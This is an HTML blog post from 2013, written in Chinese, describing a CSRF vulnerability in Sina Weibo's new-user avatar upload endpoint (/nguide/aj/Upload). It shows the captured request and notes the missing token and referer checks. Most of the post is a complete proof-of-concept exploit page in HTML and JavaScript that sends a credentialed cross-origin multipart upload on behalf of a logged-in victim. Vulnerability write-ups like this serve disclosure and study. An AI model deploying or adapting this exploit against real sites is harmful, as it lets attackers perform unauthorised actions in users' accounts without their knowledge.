@@ -1,0 +1,286 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+<head>
+   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+   <title>利用csrf上传文件 &larr; </title>
+   <meta name="author" content="litsand" />
+
+   <link rel="start" href="/" />
+
+	
+	
+	
+  	<link rel="alternate" type="application/atom+xml" href="http://feeds.feedburner.com/feedname" title="RSS feed" />
+	
+	
+
+   <!-- syntax highlighting CSS -->
+   <link rel="stylesheet" href="/assets/themes/mark-reid/css/syntax.css" type="text/css" />
+
+   <!-- Homepage CSS -->
+   <link rel="stylesheet" href="/assets/themes/mark-reid/css/screen.css" type="text/css" />
+
+</head>
+<body id="">
+<div id="site">
+  
+  <div id="header">
+    <h1>
+    	<a href="/" title="normal world">normal world</a>
+    	<span class="byline">&larr; <a href="/">litsand</a></span>
+    </h1>
+    <ul class="nav">
+      <li><a class="home" href="/">Home</a></li>
+      <li><a  href="/archive.html">Archive</a></li>
+      <li><a  href="/pages.html">Pages</a></li>
+      <li><a  href="/categories.html">Categories</a></li>
+      <li><a  href="/tags.html">Tags</a></li>
+    </ul>
+  </div>
+
+  
+<div id="page">
+	
+  <h1 class="emphnext">利用csrf上传文件</h1>
+  <ul class="tag_box inline">
+  
+  
+
+
+  
+     
+    	<li><a href="/tags.html#csrf-ref">csrf <span>3</span></a></li>
+    
+  
+
+
+
+  </ul>
+
+  <h2 id='id306'>参考资料</h2>
+
+<p>http://blog.kotowicz.net/2011/05/invisible-arbitrary-csrf-file-upload-in.html</p>
+
+<p>http://gerionsecurity.com/2013/04/here-it-is-the-file-upload-csrf/</p>
+
+<p>新浪微博新注册用户的引导上传用户头像的接口没有防御csrf,通常的用户上传文件是需要交互,利用难度较大.不过html5有一个新特性<a href='http://www.w3.org/TR/cors'>CORS</a>,可以实现无交互的上传文件.</p>
+
+<p>存在csrf的地方:</p>
+
+<pre><code>POST /nguide/aj/Upload HTTP/1.1
+Host: weibo.com
+User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:24.0) Gecko/20100101 Firefox/24.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-gb,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: lang=zh-cn; UOR=www.wooyun.org
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=---------------------------246862377417659
+Content-Length: 71483
+
+-----------------------------246862377417659
+Content-Disposition: form-data; name=&quot;filedata&quot;; filename=&quot;Sunset.jpg&quot;
+Content-Type: image/jpeg</code></pre>
+
+<p>话说有个疑问,为什么我的cookie里会有www.wooyun.org这个字段?????</p>
+
+<p>这个地方的post请求既没有token,也没对refer进行验证.</p>
+
+<p>所以构造如下poc</p>
+
+<pre><code>&lt;!DOCTYPE html&gt; 
+&lt;html&gt; 
+&lt;head&gt;
+&lt;meta charset=utf-8 /&gt;
+&lt;link href=&#39;http://fonts.googleapis.com/css?family=Inconsolata&#39; rel=&#39;stylesheet&#39; type=&#39;text/css&#39;&gt; 
+&lt;script src=&quot;http://ajax.googleapis.com/ajax/libs/jquery/1.5.2/jquery.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;
+&lt;style&gt;
+body {background: #333; color: #eee; font-family: &#39;Inconsolata&#39;, Verdana, sans-serif;}
+a:link {color: green; }
+a:visited {color: darkgreen;}
+&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;sina weibo CSRF arbitrary file upload&lt;/h1&gt;
+
+&lt;h2&gt;Step 1&lt;/h2&gt;
+Log in into &lt;a href=&quot;http://weibo.com&quot;&gt;weibo.com&lt;/a&gt; (skip this if you use &#39;remember me&#39; feature)
+&lt;h2&gt;Step 2&lt;/h2&gt;
+&lt;button type=&quot;button&quot; id=&quot;upload&quot; onclick=&quot;start()&quot;&gt;&lt;font size=&quot;+2&quot;&gt;Let&#39;s have some fun!&lt;/font&gt;&lt;/button&gt;
+&lt;script&gt;
+var logUrl = &#39;http://weibo.com/nguide/aj/Upload/&#39;;
+
+function byteValue(x) {
+return x.charCodeAt(0) &amp; 0xff;
+}
+
+function toBytes(datastr) {
+var ords = Array.prototype.map.call(datastr, byteValue);
+var ui8a = new Uint8Array(ords);
+return ui8a.buffer;
+}
+
+if (typeof XMLHttpRequest.prototype.sendAsBinary == &#39;undefined&#39; &amp;&amp; Uint8Array) {
+XMLHttpRequest.prototype.sendAsBinary = function(datastr) {
+this.send(toBytes(datastr));
+}
+}
+
+function fileUpload(fileData, fileName) {
+var fileSize = fileData.length,
+boundary = &quot;9849436581144108930470211272&quot;,
+uri = logUrl,
+xhr = new XMLHttpRequest();
+
+var additionalFields = {
+rawpic: 1
+}
+
+var fileFieldName = &quot;filedata&quot;;
+
+xhr.open(&quot;POST&quot;, uri, true);
+xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;multipart/form-data, boundary=&quot;+boundary); // simulate a file MIME POST request.
+xhr.setRequestHeader(&quot;Content-Length&quot;, fileSize);
+xhr.withCredentials = &quot;true&quot;;
+
+xhr.onreadystatechange = function() {
+if (xhr.readyState == 4) {
+if ((xhr.status &gt;= 200 &amp;&amp; xhr.status &lt;= 200) || xhr.status == 304) {
+
+if (xhr.responseText != &quot;&quot;) {
+alert(JSON.parse(xhr.responseText).msg); // display response.
+}
+} else if (xhr.status == 0) {
+$(&quot;#goto&quot;).show();
+}
+}
+}
+
+var body = &quot;&quot;;
+
+for (var i in additionalFields) {
+if (additionalFields.hasOwnProperty(i)) {
+body += addField(i, additionalFields[i], boundary);
+}
+}
+
+body += addFileField(fileFieldName, fileData, fileName, boundary);
+body += &quot;--&quot; + boundary + &quot;--&quot;;
+xhr.sendAsBinary(body);
+return true;
+}
+
+function addField(name, value, boundary) {
+var c = &quot;--&quot; + boundary + &quot;\r\n&quot;
+c += &quot;Content-Disposition: form-data; name=&#39;&quot; + name + &quot;&#39;\r\n\r\n&quot;;
+c += value + &quot;\r\n&quot;;
+return c;
+}
+
+function addFileField(name, value, filename, boundary) {
+var c = &quot;--&quot; + boundary + &quot;\r\n&quot;
+c += &quot;Content-Disposition: form-data; name=&#39;&quot; + name + &quot;&#39;; filename=&#39;&quot; + filename + &quot;&#39;\r\n&quot;;
+c += &quot;Content-Type: image/jpeg\r\n\r\n&quot;;
+c += value + &quot;\r\n&quot;;
+return c;	
+}
+
+function load_binary_resource(url) {
+var req = new XMLHttpRequest();
+req.open(&#39;GET&#39;, url, false);
+//XHR binary charset opt by Marcus Granado 2006 [http://mgran.blogspot.com]
+req.overrideMimeType(&#39;text/plain; charset=x-user-defined&#39;);
+req.send(null);
+if (req.status != 200) return &#39;&#39;;
+var bytes = Array.prototype.map.call(req.responseText, byteValue);
+return String.fromCharCode.apply(this, bytes);
+return req.responseText;
+}
+
+var start = function() {
+var c = load_binary_resource(&#39;html5.jpg&#39;);
+fileUpload(c, &#39;html5.jpg&#39;);
+};
+//start();
+
+&lt;/script&gt;
+&lt;/div&gt;
+&lt;div id=&quot;goto&quot; style=&quot;display:none&quot;&gt;
+&lt;h2&gt;Step 3&lt;/h2&gt;
+Done! &lt;a href=&quot;http://weibo.com&quot;&gt;see for yourself!&lt;/a&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+<p>测试浏览器:firefox24.0</p>
+
+  <address class="signature">
+    <a class="author" href="/">litsand</a> 
+    <span class="date">12 November 2013</span>
+    <span class="location"></span>
+  </address>
+  
+  <div class="prev-next">
+  
+    <a href="/2013/11/12/csrftest" class="next" title="网易微博头像csrf上传test">Next Post &rarr;</a>
+  
+  
+    <a href="/技术研究/2013/11/11/windows" class="prev" title="审计windows文件访问">&larr; Earlier Post</a>
+  
+  </div>
+  
+</div><!-- End Page -->
+
+
+
+
+  
+  <div id="footer">
+  	<address>
+  		<span class="copyright">
+  			Content by <a href="/info/site.html">litsand</a>. Design by 
+  			<a href="http://mark.reid.name/">Mark Reid</a>
+  			<br/>
+  			(<a rel="licence" href="http://creativecommons.org/licenses/by-nc-sa/3.0/">Some rights reserved</a>)			
+  		</span>
+  		<span class="engine">
+  			Powered by <a href="http://github.com/mojombo/jekyll/" title="A static, minimalist CMS">Jekyll</a>
+  		</span>
+  	</address>
+  </div>
+  
+</div>
+
+<!--[if IE 6]>
+<script type="text/javascript"> 
+	/*Load jQuery if not already loaded*/ if(typeof jQuery == 'undefined'){ document.write("<script type=\"text/javascript\"   src=\"http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js\"></"+"script>"); var __noconflict = true; } 
+	var IE6UPDATE_OPTIONS = {
+		icons_path: "http://static.ie6update.com/hosted/ie6update/images/"
+	}
+</script>
+<script type="text/javascript" src="http://static.ie6update.com/hosted/ie6update/ie6update.js"></script>
+<![endif]-->
+
+  
+
+
+  <script type="text/javascript">
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-123-12']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+</script>
+
+
+
+</body>
+</html>
+
